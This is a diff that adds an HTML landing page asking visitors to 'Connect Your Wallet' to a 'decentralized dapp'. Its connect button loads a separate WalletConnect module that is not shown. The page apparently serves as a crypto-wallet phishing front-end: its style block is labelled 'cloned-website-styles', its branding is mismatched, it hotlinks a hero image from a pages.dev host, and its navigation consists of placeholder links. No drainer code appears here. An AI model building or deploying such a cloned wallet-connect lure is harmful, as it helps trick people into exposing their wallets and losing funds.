@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Wallet Inspector - Manage your digital wallets with our comprehensive inspection tool.">
+    <meta property="og:image" content="/Decen.png">
+    <meta property="og:image:width" content="1622">
+    <meta property="og:image:height" content="970">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="/Decen.png">
+    <title>Dashboard - Dev Support</title>
+    <script src="config.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style id="cloned-website-styles">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #141414;
+            color: #f7f7f7;
+        }
+
+        .navbar {
+            background-color: #262828;
+            border-radius: 25px;
+            margin: 20px 40px;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #3f4141;
+        }
+
+        .nav-logo img {
+            width: 180px;
+            height: auto;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+            flex: 1;
+            margin-left: 50px;
+        }
+
+        .nav-links a {
+            color: #f7f7f7;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: #3396ff;
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 15px;
+            margin-left: auto;
+        }
+
+        .nav-buttons .btn {
+            background-color: transparent;
+            border: 1px solid #5c5d5d;
+            color: #f7f7f7;
+            border-radius: 25px;
+            padding: 7px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .nav-buttons .btn:hover {
+            background-color: #3396ff;
+            border-color: #3396ff;
+            color: #ffffff;
+        }
+
+        .wallet-section {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 70vh;
+            text-align: center;
+            padding: 60px 40px;
+            background: linear-gradient(135deg, rgba(51, 150, 255, 0.1) 0%, rgba(51, 150, 255, 0.05) 100%),
+                        url('https://synchronizedportals.pages.dev/hero-image.jpeg') center/cover no-repeat;
+            background-attachment: fixed;
+            border-radius: 50px;
+            margin: 40px;
+            border: 1px solid #3f4141;
+            position: relative;
+        }
+
+        .wallet-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(20, 20, 20, 0.7);
+            border-radius: 50px;
+            z-index: 1;
+        }
+
+        .wallet-content {
+            position: relative;
+            z-index: 2;
+            max-width: 600px;
+        }
+
+        .wallet-content h1 {
+            font-size: 48px;
+            font-weight: 600;
+            color: #f7f7f7;
+            margin-bottom: 30px;
+            line-height: 1.3;
+            letter-spacing: 0.5px;
+        }
+
+        .wallet-content p {
+            font-size: 18px;
+            color: #c0c0c0;
+            margin-bottom: 40px;
+            line-height: 1.6;
+        }
+
+        .wallet-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #3396ff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 30px;
+            font-size: 40px;
+            color: #ffffff;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, #3396ff 0%, #2a7dd7 100%);
+            border: none;
+            color: #ffffff;
+            border-radius: 25px;
+            padding: 15px 50px;
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(51, 150, 255, 0.3);
+        }
+
+        .connect-btn:hover {
+            background: linear-gradient(135deg, #2a7dd7 0%, #1f5fa0 100%);
+            box-shadow: 0 6px 20px rgba(51, 150, 255, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .footer-section {
+            background-color: #262828;
+            padding: 60px 40px;
+            margin-top: 60px;
+            border-top: 1px solid #3f4141;
+            text-align: center;
+        }
+
+        .footer-section img {
+            max-width: 200px;
+            height: auto;
+            margin-bottom: 30px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column h5 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #f7f7f7;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .footer-column a {
+            color: #c0c0c0;
+            text-decoration: none;
+            font-size: 14px;
+            line-height: 1.8;
+            transition: color 0.3s ease;
+        }
+
+        .footer-column a:hover {
+            color: #3396ff;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #3f4141;
+            padding-top: 30px;
+            color: #5c5d5d;
+            font-size: 13px;
+        }
+
+        @media (max-width: 900px) {
+            .navbar {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .nav-links {
+                margin-left: 0;
+            }
+
+            .nav-buttons {
+                margin-left: 0;
+                width: 100%;
+                justify-content: center;
+            }
+
+            .wallet-section {
+                min-height: 50vh;
+                padding: 40px 20px;
+            }
+
+            .wallet-content h1 {
+                font-size: 36px;
+            }
+        }
+
+        @media (max-width: 540px) {
+            .navbar {
+                margin: 15px 20px;
+                padding: 10px 15px;
+            }
+
+            .nav-logo img {
+                width: 120px;
+            }
+
+            .nav-links {
+                gap: 15px;
+                font-size: 12px;
+            }
+
+            .wallet-section {
+                min-height: 40vh;
+                margin: 20px;
+                padding: 30px 15px;
+            }
+
+            .wallet-content h1 {
+                font-size: 28px;
+                margin-bottom: 20px;
+            }
+
+            .wallet-content p {
+                font-size: 16px;
+                margin-bottom: 30px;
+            }
+
+            .connect-btn {
+                padding: 12px 35px;
+                font-size: 14px;
+            }
+
+            .footer-section {
+                padding: 40px 20px;
+            }
+
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Navigation Header -->
+    <div class="navbar">
+        <div class="nav-logo">
+            <a href="" class="logo-img"><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAzIiBoZWlnaHQ9IjMyIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGNsaXAtcGF0aD0idXJsKCNhKSIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTEyLjIwOSA5LjA1OWM2LjAzOC01LjkxIDE1LjgyOS01LjkxIDIxLjg2NyAwbC43MjcuNzExYS43NDUuNzQ1IDAgMCAxIDAgMS4wN2wtMi40ODYgMi40MzNhLjM5My4zOTMgMCAwIDEtLjU0NyAwbC0xLS45NzljLTQuMjEyLTQuMTIyLTExLjA0Mi00LjEyMi0xNS4yNTUgMGwtMS4wNzEgMS4wNDhhLjM5My4zOTMgMCAwIDEtLjU0NyAwbC0yLjQ4Ni0yLjQzM2EuNzQ1Ljc0NSAwIDAgMSAwLTEuMDdsLjc5OC0uNzhabTI3LjAwOSA1LjAzMSAyLjIxMiAyLjE2NmEuNzQ1Ljc0NSAwIDAgMSAwIDEuMDdsLTkuOTc2IDkuNzY0YS43ODUuNzg1IDAgMCAxLTEuMDk0IDBsLTcuMDgtNi45M2EuMTk2LjE5NiAwIDAgMC0uMjc0IDBsLTcuMDggNi45M2EuNzg1Ljc4NSAwIDAgMS0xLjA5NCAwbC05Ljk3Ny05Ljc2NGEuNzQ1Ljc0NSAwIDAgMSAwLTEuMDdsMi4yMTMtMi4xNjZhLjc4NS43ODUgMCAwIDEgMS4wOTMgMGw3LjA4IDYuOTNhLjE5Ni4xOTYgMCAwIDAgLjI3NCAwbDcuMDgtNi45M2EuNzg1Ljc4NSAwIDAgMSAxLjA5NCAwbDcuMDgxIDYuOTNhLjE5Ni4xOTYgMCAwIDAgLjI3NCAwbDcuMDgtNi45M2EuNzg1Ljc4NSAwIDAgMSAxLjA5NCAwWk01NC45NjMgMjMuOTRsMi42NzMtMTAuNjljLjE1OC0uNTkuMjk0LTEuMjI0LjQ3NS0yLjIyLjEzNi45OTYuMjk1IDEuNjMuNDA4IDIuMjJsMi4zMSAxMC42OWg0Ljc4TDY5LjY0IDguMDg1aC0zLjY3bC0yLjIxOSA5Ljc0YTI4LjM4IDI4LjM4IDAgMCAwLS41MiAyLjgwOGMtLjE4Mi0xLjA2NC0uMzYzLTEuODU3LS41NjctMi43ODZsLTIuMTUyLTkuNzYySDU1LjcxbC0yLjMzMyA5Ljc2MmE0Ny4xMjMgNDcuMTIzIDAgMCAwLS41NDMgMi43ODYgNDcuMDQyIDQ3LjA0MiAwIDAgMC0uNTQ0LTIuNzg2bC0yLjE3NC05Ljc2MmgtMy44MjhsNC4wMDkgMTUuODU1aDQuNjY2Wk03Mi4zNzYgMjQuMzQ4YzEuODEyIDAgMi45NjctLjc0OCAzLjU1Ni0xLjgzNS0uMDY4LjM0LS4wOS42OC0uMDkgMS4wMnYuNDA3aDMuMDM1di02LjU0NmMwLTMuMTI1LTEuNDI3LTQuOTM3LTQuOTE1LTQuOTM3LTMuMDEzIDAtNC45ODMgMS42NzYtNS4xNjQgMy45ODZoMy4zM2MuMTEyLTEuMDIuODM3LTEuNjMgMS45NDctMS42MyAxLjA0MiAwIDEuNjA4LjU4OCAxLjYwOCAxLjI2OCAwIC40OTgtLjI5NC43OTItMS4xNzguOTA1bC0xLjU4NS4xODJjLTIuMzU2LjI5NC00LjM3MSAxLjE1NS00LjM3MSAzLjY0NiAwIDIuMjY1IDEuODggMy41MzQgMy44MjcgMy41MzRabTEuMDItMi4zMzNjLS44ODQgMC0xLjU0LS40OTgtMS41NC0xLjM2IDAtLjgzNy43NDctMS4yNDUgMS44OC0xLjQ0OWwuNzctLjEzNmMuNjU2LS4xMzYgMS4wMTktLjI0OSAxLjI0NS0uNDUzdjEuMDQyYzAgMS40MDUtMS4wMiAyLjM1Ni0yLjM1NiAyLjM1NlpNODAuNDU1IDguMDg1VjIzLjk0aDMuMjg0VjguMDg1aC0zLjI4NFpNODUuNjM5IDguMDg1VjIzLjk0aDMuMjg0VjguMDg1aC0zLjI4NFpNOTYuMDkyIDI0LjM0OGMzLjEyNiAwIDUuMTQxLTEuNzY3IDUuMzY4LTQuMDc3aC0zLjMwN2MtLjE1OSAxLjAxOS0xLjAyIDEuNTg1LTIuMDYxIDEuNTg1LTEuNDA0IDAtMi40MjQtMS4xMzItMi40NDYtMi42OTVoNy44ODJ2LS42MzRjMC0zLjY3LTIuMDE2LTYuMDctNS41MDQtNi4wNy0zLjM1MiAwLTUuNzA4IDIuMzU1LTUuNzA4IDUuOTExIDAgMy44NSAyLjQyNCA1Ljk4IDUuNzc2IDUuOThabS0yLjQ3LTcuMzM5Yy4xMzctMS4yNjggMS4wNjYtMi4xOTcgMi4zOC0yLjE5NyAxLjI2OCAwIDIuMTUuODgzIDIuMTc0IDIuMTk3aC00LjU1M1pNMTA4LjQ3OSAyNC4xNjZjLjcyNSAwIDEuNDI3LS4xMTMgMS43NDQtLjIwM1YyMS40N2E0LjY3OCA0LjY3OCAwIDAgMS0uNzkzLjA2OGMtMS4yIDAtMS42My0uNjgtMS42My0xLjc5di00LjM0OGgyLjY3MnYtMi41NkgxMDcuOHYtMy45NGgtMy4yNjJ2My45NGgtMi40MDF2Mi41NmgyLjQwMXY0LjgwMmMwIDIuNjI3IDEuMzE0IDMuOTYzIDMuOTQxIDMuOTYzWk0xMTkuNTY1IDI0LjM0OGM0LjQ4NSAwIDcuMjAzLTIuNjI4IDcuNTQzLTYuNDFoLTMuNTU2Yy0uMjcyIDIuMDYtMS43MjIgMy40NjUtMy44NTEgMy40NjUtMi41MTQgMC00LjI4MS0yLjAzOC00LjI4MS01LjQ4MSAwLTMuMzc1IDEuODM1LTUuMyA0LjM0OS01LjMgMi4xNTIgMCAzLjM3NSAxLjMxNCAzLjYyNCAzLjIzOWgzLjY0N2MtLjM2My0zLjk0MS0zLjI2Mi02LjE4NC03LjI0OC02LjE4NC00LjU1MyAwLTguMDQxIDMuMDgtOC4wNDEgOC4yNDUgMCA1LjM0NSAzLjA1OCA4LjQyNiA3LjgxNCA4LjQyNlpNMTM0LjIyOCAyNC4zNDhjMy40MiAwIDUuODQ0LTIuMTUyIDUuODQ0LTUuOTEyIDAtMy42OTItMi40MjQtNS45OC01Ljg0NC01Ljk4LTMuMzk4IDAtNS44MjEgMi4yODgtNS44MjEgNS45OCAwIDMuNzYgMi40MDEgNS45MTIgNS44MjEgNS45MTJabTAtMi41MzdjLTEuNTE4IDAtMi40OTItMS4yNDYtMi40OTItMy4zNzUgMC0yLjE3NCAxLjAyLTMuMzk3IDIuNDkyLTMuMzk3IDEuNDk1IDAgMi41MTQgMS4yMjMgMi41MTQgMy4zOTcgMCAyLjEzLS45OTcgMy4zNzUtMi41MTQgMy4zNzVaTTE0NC42NSAyMy45NHYtNi41YzAtMS4zODIuODYxLTIuNDAxIDIuMDg0LTIuNDAxIDEuMTU1IDAgMS44MzUuODgzIDEuODM1IDIuMzU1djYuNTQ2aDMuMjg0di03LjAyMWMwLTIuNjczLTEuNDA0LTQuNDYzLTMuOTE5LTQuNDYzLTEuNzQ0IDAtMi44MDguODM4LTMuMzc0IDEuODM1YTYuMTEgNi4xMSAwIDAgMCAuMDktMS4wMnYtLjQzaC0zLjI4NFYyMy45NGgzLjI4NFpNMTU3LjEwMiAyMy45NHYtNi41YzAtMS4zODIuODYtMi40MDEgMi4wODMtMi40MDEgMS4xNTYgMCAxLjgzNS44ODMgMS44MzUgMi4zNTV2Ni41NDZoMy4yODR2LTcuMDIxYzAtMi42NzMtMS40MDQtNC40NjMtMy45MTgtNC40NjMtMS43NDQgMC0yLjgwOS44MzgtMy4zNzUgMS44MzUuMDY4LS40MDguMDkxLS43MjUuMDkxLTEuMDJ2LS40M2gtMy4yODVWMjMuOTRoMy4yODVaTTE3MS4zNzEgMjQuMzQ4YzMuMTI1IDAgNS4xNDEtMS43NjcgNS4zNjgtNC4wNzdoLTMuMzA3Yy0uMTU5IDEuMDE5LTEuMDE5IDEuNTg1LTIuMDYxIDEuNTg1LTEuNDA1IDAtMi40MjQtMS4xMzItMi40NDYtMi42OTVoNy44ODJ2LS42MzRjMC0zLjY3LTIuMDE2LTYuMDctNS41MDQtNi4wNy0zLjM1MiAwLTUuNzA4IDIuMzU1LTUuNzA4IDUuOTExIDAgMy44NSAyLjQyNCA1Ljk4IDUuNzc2IDUuOThabS0yLjQ2OS03LjMzOWMuMTM2LTEuMjY4IDEuMDY0LTIuMTk3IDIuMzc4LTIuMTk3IDEuMjY4IDAgMi4xNTIuODgzIDIuMTc0IDIuMTk3aC00LjU1MlpNMTgzLjg1OSAyNC4zNDhjMy40NDMgMCA1LjMyMy0xLjg4IDUuNjg1LTQuODAyaC0zLjI4NGMtLjExNCAxLjIyMy0uODE2IDIuMjY1LTIuMjg4IDIuMjY1LTEuNDk1IDAtMi41MTQtMS4zODItMi41MTQtMy40MiAwLTIuMjIgMS4xNzgtMy4zNTIgMi41ODItMy4zNTIgMS4zODIgMCAyLjA2MS45OTYgMi4xNTIgMi4xNTFoMy4yODRjLS4yNDktMi42OTUtMi4wODQtNC43MzQtNS40NTktNC43MzQtMy4yODQgMC01Ljg4OSAyLjE3NS01Ljg4OSA1LjkzNSAwIDMuNzE0IDIuMTk3IDUuOTU3IDUuNzMxIDUuOTU3Wk0xOTYuNjQ4IDI0LjE2NmMuNzI1IDAgMS40MjctLjExMyAxLjc0NC0uMjAzVjIxLjQ3YTQuNjg3IDQuNjg3IDAgMCAxLS43OTMuMDY4Yy0xLjIgMC0xLjYzMS0uNjgtMS42MzEtMS43OXYtNC4zNDhoMi42NzN2LTIuNTZoLTIuNjczdi0zLjk0aC0zLjI2MXYzLjk0aC0yLjQwMXYyLjU2aDIuNDAxdjQuODAyYzAgMi42MjcgMS4zMTMgMy45NjMgMy45NDEgMy45NjNaIi8+PC9nPjxkZWZzPjxjbGlwUGF0aCBpZD0iYSI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgMGgyMDIuNjAydjMySDB6Ii8+PC9jbGlwUGF0aD48L2RlZnM+PC9zdmc+" alt="" class="img-fluid"></a>
+        </div>
+        <div class="nav-links">
+            <a href="https://github.com" target="_blank">GitHub</a>
+            <a href="#features">Features</a>
+            <a href="#about">About</a>
+        </div>
+        <div class="nav-buttons">
+            <a href="index.html" class="btn">Account</a>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main>
+        <!-- Wallet Connection Section -->
+        <section class="wallet-section">
+            <div class="wallet-content">
+                <div class="wallet-icon">
+                    <i class="fas fa-wallet"></i>
+                </div>
+                <h1>Connect Your Wallet</h1>
+                <p>To access the dashboard and continue on our decentralized dapp, please connect your wallet.</p>
+                <button class="connect-btn" id="open-modal">
+                    <i class="fas fa-link"></i> Connect Wallet
+                </button>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <div class="footer-section">
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAzIiBoZWlnaHQ9IjMyIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGNsaXAtcGF0aD0idXJsKCNhKSIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTEyLjIwOSA5LjA1OWM2LjAzOC01LjkxIDE1LjgyOS01LjkxIDIxLjg2NyAwbC43MjcuNzExYS43NDUuNzQ1IDAgMCAxIDAgMS4wN2wtMi40ODYgMi40MzNhLjM5My4zOTMgMCAwIDEtLjU0NyAwbC0xLS45NzljLTQuMjEyLTQuMTIyLTExLjA0Mi00LjEyMi0xNS4yNTUgMGwtMS4wNzEgMS4wNDhhLjM5My4zOTMgMCAwIDEtLjU0NyAwbC0yLjQ4Ni0yLjQzM2EuNzQ1Ljc0NSAwIDAgMSAwLTEuMDdsLjc5OC0uNzhabTI3LjAwOSA1LjAzMSAyLjIxMiAyLjE2NmEuNzQ1Ljc0NSAwIDAgMSAwIDEuMDdsLTkuOTc2IDkuNzY0YS43ODUuNzg1IDAgMCAxLTEuMDk0IDBsLTcuMDgtNi45M2EuMTk2LjE5NiAwIDAgMC0uMjc0IDBsLTcuMDggNi45M2EuNzg1Ljc4NSAwIDAgMS0xLjA5NCAwbC05Ljk3Ny05Ljc2NGEuNzQ1Ljc0NSAwIDAgMSAwLTEuMDdsMi4yMTMtMi4xNjZhLjc4NS43ODUgMCAwIDEgMS4wOTMgMGw3LjA4IDYuOTNhLjE5Ni4xOTYgMCAwIDAgLjI3NCAwbDcuMDgtNi45M2EuNzg1Ljc4NSAwIDAgMSAxLjA5NCAwbDcuMDgxIDYuOTNhLjE5Ni4xOTYgMCAwIDAgLjI3NCAwbDcuMDgtNi45M2EuNzg1Ljc4NSAwIDAgMSAxLjA5NCAwWk01NC45NjMgMjMuOTRsMi42NzMtMTAuNjljLjE1OC0uNTkuMjk0LTEuMjI0LjQ3NS0yLjIyLjEzNi45OTYuMjk1IDEuNjMuNDA4IDIuMjJsMi4zMSAxMC42OWg0Ljc4TDY5LjY0IDguMDg1aC0zLjY3bC0yLjIxOSA5Ljc0YTI4LjM4IDI4LjM4IDAgMCAwLS41MiAyLjgwOGMtLjE4Mi0xLjA2NC0uMzYzLTEuODU3LS41NjctMi43ODZsLTIuMTUyLTkuNzYySDU1LjcxbC0yLjMzMyA5Ljc2MmE0Ny4xMjMgNDcuMTIzIDAgMCAwLS41NDMgMi43ODYgNDcuMDQyIDQ3LjA0MiAwIDAgMC0uNTQ0LTIuNzg2bC0yLjE3NC05Ljc2MmgtMy44MjhsNC4wMDkgMTUuODU1aDQuNjY2Wk03Mi4zNzYgMjQuMzQ4YzEuODEyIDAgMi45NjctLjc0OCAzLjU1Ni0xLjgzNS0uMDY4LjM0LS4wOS42OC0uMDkgMS4wMnYuNDA3aDMuMDM1di02LjU0NmMwLTMuMTI1LTEuNDI3LTQuOTM3LTQuOTE1LTQuOTM3LTMuMDEzIDAtNC45ODMgMS42NzYtNS4xNjQgMy45ODZoMy4zM2MuMTEyLTEuMDIuODM3LTEuNjMgMS45NDctMS42MyAxLjA0MiAwIDEuNjA4LjU4OCAxLjYwOCAxLjI2OCAwIC40OTgtLjI5NC43OTItMS4xNzguOTA1bC0xLjU4NS4xODJjLTIuMzU2LjI5NC00LjM3MSAxLjE1NS00LjM3MSAzLjY0NiAwIDIuMjY1IDEuODggMy41MzQgMy44MjcgMy41MzRabTEuMDItMi4zMzNjLS44ODQgMC0xLjU0LS40OTgtMS41NC0xLjM2IDAtLjgzNy43NDctMS4yNDUgMS44OC0xLjQ0OWwuNzctLjEzNmMuNjU2LS4xMzYgMS4wMTktLjI0OSAxLjI0NS0uNDUzdjEuMDQyYzAgMS40MDUtMS4wMiAyLjM1Ni0yLjM1NiAyLjM1NlpNODAuNDU1IDguMDg1VjIzLjk0aDMuMjg0VjguMDg1aC0zLjI4NFpNODUuNjM5IDguMDg1VjIzLjk0aDMuMjg0VjguMDg1aC0zLjI4NFpNOTYuMDkyIDI0LjM0OGMzLjEyNiAwIDUuMTQxLTEuNzY3IDUuMzY4LTQuMDc3aC0zLjMwN2MtLjE1OSAxLjAxOS0xLjAyIDEuNTg1LTIuMDYxIDEuNTg1LTEuNDA0IDAtMi40MjQtMS4xMzItMi40NDYtMi42OTVoNy44ODJ2LS42MzRjMC0zLjY3LTIuMDE2LTYuMDctNS41MDQtNi4wNy0zLjM1MiAwLTUuNzA4IDIuMzU1LTUuNzA4IDUuOTExIDAgMy44NSAyLjQyNCA1Ljk4IDUuNzc2IDUuOThabS0yLjQ3LTcuMzM5Yy4xMzctMS4yNjggMS4wNjYtMi4xOTcgMi4zOC0yLjE5NyAxLjI2OCAwIDIuMTUuODgzIDIuMTc0IDIuMTk3aC00LjU1M1pNMTA4LjQ3OSAyNC4xNjZjLjcyNSAwIDEuNDI3LS4xMTMgMS43NDQtLjIwM1YyMS40N2E0LjY3OCA0LjY3OCAwIDAgMS0uNzkzLjA2OGMtMS4yIDAtMS42My0uNjgtMS42My0xLjc5di00LjM0OGgyLjY3MnYtMi41NkgxMDcuOHYtMy45NGgtMy4yNjJ2My45NGgtMi40MDF2Mi41NmgyLjQwMXY0LjgwMmMwIDIuNjI3IDEuMzE0IDMuOTYzIDMuOTQxIDMuOTYzWk0xMTkuNTY1IDI0LjM0OGM0LjQ4NSAwIDcuMjAzLTIuNjI4IDcuNTQzLTYuNDFoLTMuNTU2Yy0uMjcyIDIuMDYtMS43MjIgMy40NjUtMy44NTEgMy40NjUtMi41MTQgMC00LjI4MS0yLjAzOC00LjI4MS01LjQ4MSAwLTMuMzc1IDEuODM1LTUuMyA0LjM0OS01LjMgMi4xNTIgMCAzLjM3NSAxLjMxNCAzLjYyNCAzLjIzOWgzLjY0N2MtLjM2My0zLjk0MS0zLjI2Mi02LjE4NC03LjI0OC02LjE4NC00LjU1MyAwLTguMDQxIDMuMDgtOC4wNDEgOC4yNDUgMCA1LjM0NSAzLjA1OCA4LjQyNiA3LjgxNCA4LjQyNlpNMTM0LjIyOCAyNC4zNDhjMy40MiAwIDUuODQ0LTIuMTUyIDUuODQ0LTUuOTEyIDAtMy42OTItMi40MjQtNS45OC01Ljg0NC01Ljk4LTMuMzk4IDAtNS44MjEgMi4yODgtNS44MjEgNS45OCAwIDMuNzYgMi40MDEgNS45MTIgNS44MjEgNS45MTJabTAtMi41MzdjLTEuNTE4IDAtMi40OTItMS4yNDYtMi40OTItMy4zNzUgMC0yLjE3NCAxLjAyLTMuMzk3IDIuNDkyLTMuMzk3IDEuNDk1IDAgMi41MTQgMS4yMjMgMi41MTQgMy4zOTcgMCAyLjEzLS45OTcgMy4zNzUtMi41MTQgMy4zNzVaTTE0NC42NSAyMy45NHYtNi41YzAtMS4zODIuODYxLTIuNDAxIDIuMDg0LTIuNDAxIDEuMTU1IDAgMS44MzUuODgzIDEuODM1IDIuMzU1djYuNTQ2aDMuMjg0di03LjAyMWMwLTIuNjczLTEuNDA0LTQuNDYzLTMuOTE5LTQuNDYzLTEuNzQ0IDAtMi44MDguODM4LTMuMzc0IDEuODM1YTYuMTEgNi4xMSAwIDAgMCAuMDktMS4wMnYtLjQzaC0zLjI4NFYyMy45NGgzLjI4NFpNMTU3LjEwMiAyMy45NHYtNi41YzAtMS4zODIuODYtMi40MDEgMi4wODMtMi40MDEgMS4xNTYgMCAxLjgzNS44ODMgMS44MzUgMi4zNTV2Ni41NDZoMy4yODR2LTcuMDIxYzAtMi42NzMtMS40MDQtNC40NjMtMy45MTgtNC40NjMtMS43NDQgMC0yLjgwOS44MzgtMy4zNzUgMS44MzUuMDY4LS40MDguMDkxLS43MjUuMDkxLTEuMDJ2LS40M2gtMy4yODVWMjMuOTRoMy4yODVaTTE3MS4zNzEgMjQuMzQ4YzMuMTI1IDAgNS4xNDEtMS43NjcgNS4zNjgtNC4wNzdoLTMuMzA3Yy0uMTU5IDEuMDE5LTEuMDE5IDEuNTg1LTIuMDYxIDEuNTg1LTEuNDA1IDAtMi40MjQtMS4xMzItMi40NDYtMi42OTVoNy44ODJ2LS42MzRjMC0zLjY3LTIuMDE2LTYuMDctNS41MDQtNi4wNy0zLjM1MiAwLTUuNzA4IDIuMzU1LTUuNzA4IDUuOTExIDAgMy44NSAyLjQyNCA1Ljk4IDUuNzc2IDUuOThabS0yLjQ2OS03LjMzOWMuMTM2LTEuMjY4IDEuMDY0LTIuMTk3IDIuMzc4LTIuMTk3IDEuMjY4IDAgMi4xNTIuODgzIDIuMTc0IDIuMTk3aC00LjU1MlpNMTgzLjg1OSAyNC4zNDhjMy40NDMgMCA1LjMyMy0xLjg4IDUuNjg1LTQuODAyaC0zLjI4NGMtLjExNCAxLjIyMy0uODE2IDIuMjY1LTIuMjg4IDIuMjY1LTEuNDk1IDAtMi41MTQtMS4zODItMi41MTQtMy40MiAwLTIuMjIgMS4xNzgtMy4zNTIgMi41ODItMy4zNTIgMS4zODIgMCAyLjA2MS45OTYgMi4xNTIgMi4xNTFoMy4yODRjLS4yNDktMi42OTUtMi4wODQtNC43MzQtNS40NTktNC43MzQtMy4yODQgMC01Ljg4OSAyLjE3NS01Ljg4OSA1LjkzNSAwIDMuNzE0IDIuMTk3IDUuOTU3IDUuNzMxIDUuOTU3Wk0xOTYuNjQ4IDI0LjE2NmMuNzI1IDAgMS40MjctLjExMyAxLjc0NC0uMjAzVjIxLjQ3YTQuNjg3IDQuNjg3IDAgMCAxLS43OTMuMDY4Yy0xLjIgMC0xLjYzMS0uNjgtMS42MzEtMS43OXYtNC4zNDhoMi42NzN2LTIuNTZoLTIuNjczdi0zLjk0aC0zLjI2MXYzLjk0aC0yLjQwMXYyLjU2aDIuNDAxdjQuODAyYzAgMi42MjcgMS4zMTMgMy45NjMgMy45NDEgMy45NjNaIi8+PC9nPjxkZWZzPjxjbGlwUGF0aCBpZD0iYSI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgMGgyMDIuNjAydjMySDB6Ii8+PC9jbGlwUGF0aD48L2RlZnM+PC9zdmc+" alt="" class="img-fluid">
+        
+        <div class="footer-content">
+            <div class="footer-column">
+                <h5>Product</h5>
+                <a href="#features">Features</a>
+                <a href="#pricing">Pricing</a>
+                <a href="#security">Security</a>
+            </div>
+            <div class="footer-column">
+                <h5>Company</h5>
+                <a href="#about">About Us</a>
+                <a href="#blog">Blog</a>
+                <a href="#careers">Careers</a>
+            </div>
+            <div class="footer-column">
+                <h5>Support</h5>
+                <a href="#help">Help Center</a>
+                <a href="#contact">Contact Us</a>
+                <a href="#faq">FAQ</a>
+            </div>
+            <div class="footer-column">
+                <h5>Legal</h5>
+                <a href="#privacy">Privacy Policy</a>
+                <a href="#terms">Terms of Service</a>
+                <a href="#disclaimer">Disclaimer</a>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <p>&copy; 2024 Registry Community. All rights reserved.</p>
+        </div>
+    </div>
+
+    <!-- WalletConnect Modal Handler -->
+    <script>
+        // When button is clicked, trigger the WalletConnect modal
+        document.getElementById('open-modal').addEventListener('click', async function(e) {
+            e.preventDefault();
+            console.log('[HTML] Connect button clicked - triggering WalletConnect modal');
+            
+            // Import WalletConnect from the configured location
+            try {
+                const { initWalletConnect } = await import('./src/utils/walletConnect.js');
+                const provider = await initWalletConnect();
+                await provider.connect();
+                console.log('[HTML] WalletConnect modal opened successfully');
+            } catch (error) {
+                console.error('Error opening WalletConnect modal:', error);
+                // Fallback to alert
+                alert('Opening WalletConnect. Please complete the connection.');
+            }
+        });
+
+        console.log('[HTML] Page loaded - Connect button is ready');
+    </script>
+</body>
+
+</html>
